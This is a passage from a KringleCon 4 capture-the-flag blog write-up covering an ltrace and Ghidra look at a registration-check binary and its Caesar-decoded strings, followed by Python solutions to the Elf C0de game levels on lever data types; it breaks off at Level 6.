    <img data-src="/images/kringlecon4/cranpi/pi09_05.webp" alt="ltrace 2" data-caption="ltrace 2" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      ltrace 2
      
        
        
      
    </figcaption>
  
</figure>
<p>It now checks for a <code>:</code> on the same line. We add it in the same way and the last word it looks for is <code>True</code>. The final content of the file must be <code>Registration:True</code>. Now when we launch the binary we get the command <code>/bin/initialize_cotton_candy_sys</code> executed that creates a candy in the terminal!</p>
<p>Additionally, we could have retrieved the binary file and decompile it with <em>Ghidra</em> for analysis. The code is straighforward, 6 strings are initially decrypted with a custom algorithm. Then the registration file is opened and the lines are read to look for what we saw above.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi09_06.webp" alt="Ghidra - main function" data-caption="Ghidra - main function" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Ghidra - main function
      
        
        
      
    </figcaption>
  
</figure>
<p>The decryption algorithm is a basic <em>Caesar</em> with a key that is different per string. If the decrypted character equals <code>0x7f</code>, it is replaced by a space:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi09_07.webp" alt="decrypt function" data-caption="decrypt function" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      decrypt function
      
        
        
      
    </figcaption>
  
</figure>
<p>So to decrypt the first string we can use the following code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="n">ct</span> <span class="o">=</span> <span class="s2">&#34;685b5d5f696a68576a5f65642460696564&#34;</span>
<span class="n">pt</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">map</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="o">*</span>\<span class="p">[</span><span class="nb">iter</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>\<span class="p">]</span><span class="o">*</span> <span class="mi">2</span><span class="p">)):</span>
  <span class="n">pt</span> <span class="o">=</span> <span class="n">pt</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xa</span><span class="p">)</span>              <span class="c1"># key = 0xa</span>
<span class="nb">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>The output is <code>registration.json</code>.</p>
<h3 id="10---the-elf-c0de---python-edition">10 - The Elf C0de - Python Edition!</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ribb Bonbowford</td>
<td>Dining Room</td>
</tr>
</tbody>
</table>
<p>This challenge is similar to <a href="http://localhost:1313/posts/kringlecon3/#the-elf-c0de">The Elf C0de</a> challenge of last year that was dedicated to learning <em>Javascript</em>. This year will be about learning <em>Python 3</em>. The goal will be again to help the munchkin get all the lollipops and reach the castle entrance programmatically. Some levels can have constraints like resolving the level with limited lines of code or object calls.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Level 0 - Elf Code Demo<br />
Objective - This is a demo level with a <em>Python</em> solution already provided. Review the <em>Python</em> code below and click the Run button to watch the elf make it to the castle entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_02.webp" alt="Level 0" data-caption="Level 0 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 0 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The solution is given and we just need to get familiarized with the different calls and click <code>Run</code> to go to the next level. The constraint it to use no more than 22 lines of code and 8 object function calls:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="c1"># Grab our lever object</span>
<span class="n">lever</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">munchkin</span> <span class="o">=</span> <span class="n">munchkins</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">lollipop</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1"># move to lever position</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># get lever int and add 2 and submit val</span>
<span class="n">leverData</span> <span class="o">=</span> <span class="n">lever</span><span class="o">.</span><span class="n">data</span><span class="p">()</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">lever</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">leverData</span><span class="p">)</span>
<span class="c1"># Grab lollipop and stand next to munchkin</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="c1"># Solve the munchkin&#39;s challenge</span>
<span class="n">munchList</span> <span class="o">=</span> <span class="n">munchkin</span><span class="o">.</span><span class="n">ask</span><span class="p">()</span> <span class="c1"># e.g. [1, 3, &#34;a&#34;, &#34;b&#34;, 4]</span>
<span class="n">answer_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">munchList</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">elem</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
        <span class="n">answer_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">elem</span><span class="p">)</span>
<span class="n">munchkin</span><span class="o">.</span><span class="n">answer</span><span class="p">(</span><span class="n">answer_list</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Move to finish</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 1 - Get Moving<br />
Objective - Move the elf to collect the lollipops and get to the KringleCon entrance at dict location {&ldquo;x&rdquo;:2,&ldquo;y&rdquo;:2}.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_03.webp" alt="Level 1 map" data-caption="Level 1 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 1 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 8 lines of code and 6 object function calls. One solution is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 2 - Get moveTo&rsquo;ing<br />
Objective - Move the elf to collect the lollipops and get to the KringleCon entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_04.webp" alt="Level 2 map" data-caption="Level 2 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 2 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 10 lines of code and 6 object function calls. One solution is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">lollipop0</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">lollipop1</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lollipop1</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lollipop0</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveLeft</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 3 - Don&rsquo;t Get Yeeted!<br />
Objective - Move the elf to collect the lollipops and get to the KringleCon entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_05.webp" alt="Level 3 map" data-caption="Level 3 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 3 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 10 lines of code and 6 object function calls. And the lever objective is to simply add 2 to the value given by the lever. One solution is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">lever0</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">lollipop0</span> <span class="o">=</span> <span class="n">lollipops</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever0</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="nb">sum</span> <span class="o">=</span> <span class="n">lever0</span><span class="o">.</span><span class="n">data</span><span class="p">()</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">lever0</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="nb">sum</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lollipop0</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 4 - Data Types<br />
Objective - Pull ALL of the levers by submitting the requested data for each using <code>lever.pull(data)</code> to disable the <em>Yeeter</em> trap at the <em>KringleCon</em> entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_06.webp" alt="Level 4 map" data-caption="Level 4 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 4 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 18 lines of code and 15 object function calls. And the lever&rsquo;s objective is to submit different kind of data types. One solution is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">lever0</span><span class="p">,</span> <span class="n">lever1</span><span class="p">,</span> <span class="n">lever2</span><span class="p">,</span> <span class="n">lever3</span><span class="p">,</span> <span class="n">lever4</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever4</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># This lever wants a str object:</span>
<span class="n">lever4</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="s2">&#34;n00b&#34;</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever3</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># This lever wants a bool object:</span>
<span class="n">lever3</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever2</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># This lever wants a int object:</span>
<span class="n">lever2</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever1</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># This lever wants a list object:</span>
<span class="n">lever1</span><span class="o">.</span><span class="n">pull</span><span class="p">([])</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever0</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># This lever wants a dict object:</span>
<span class="n">lever0</span><span class="o">.</span><span class="n">pull</span><span class="p">({})</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 5 - Conversions and Comparisons<br />
Objective - Pull all of the levers by submitting the requested data for each using <code>lever.pull(data)</code> to disable the <em>Yeeter</em> trap at the <em>KringleCon</em> entrance.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_06.webp" alt="Level 5 map" data-caption="Level 5 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 5 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The constraint is to use no more than 23 lines of code and 18 object function calls. And the lever&rsquo;s objective are:</p>
<ul>
<li>lever 4 - get a string and return it concatenated with <code> concatenate</code></li>
<li>lever 3 - get a bool and return the inversed bool</li>
<li>lever 2 - get an integer and return the value +1</li>
<li>lever 1 - get a list and return it appended with the integer <code>1</code></li>
<li>lever 0 - get a dict and return it with a new key-value <code>&quot;strkey&quot;:&quot;strvalue&quot;</code></li>
</ul>
<p>One solution is, re-using the previous code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">import</span> <span class="nn">elf</span><span class="o">,</span> <span class="nn">munchkins</span><span class="o">,</span> <span class="nn">levers</span><span class="o">,</span> <span class="nn">lollipops</span><span class="o">,</span> <span class="nn">yeeters</span><span class="o">,</span> <span class="nn">pits</span>
<span class="n">lever0</span><span class="p">,</span> <span class="n">lever1</span><span class="p">,</span> <span class="n">lever2</span><span class="p">,</span> <span class="n">lever3</span><span class="p">,</span> <span class="n">lever4</span> <span class="o">=</span> <span class="n">levers</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever4</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># string concatenation</span>
<span class="n">lever4</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">lever4</span><span class="o">.</span><span class="n">data</span><span class="p">()</span><span class="o">+</span><span class="s2">&#34; concatenate&#34;</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever3</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># inversed bool</span>
<span class="n">lever3</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="ow">not</span><span class="p">(</span><span class="n">lever3</span><span class="o">.</span><span class="n">data</span><span class="p">()))</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever2</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># int addition</span>
<span class="n">lever2</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">lever2</span><span class="o">.</span><span class="n">data</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever1</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># append to list</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">lever1</span><span class="o">.</span><span class="n">data</span><span class="p">()</span>
<span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">lever1</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">lever0</span><span class="o">.</span><span class="n">position</span><span class="p">)</span>
<span class="c1"># add key-value to dict</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">lever0</span><span class="o">.</span><span class="n">data</span><span class="p">()</span>
<span class="n">d</span><span class="p">[</span><span class="s2">&#34;strkey&#34;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;strvalue&#34;</span>
<span class="n">lever0</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
<span class="n">elf</span><span class="o">.</span><span class="n">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 6 - Types And Conditionals<br />
Objective - Move the elf to the lever. Get the lever data <code>lever.data()</code> and perform the appropriate action to the data. Submit the modified data using <code>lever.pull(modified_data)</code>.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi10_07.webp" alt="Level 6 map" data-caption="Level 6 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Level 6 map
      
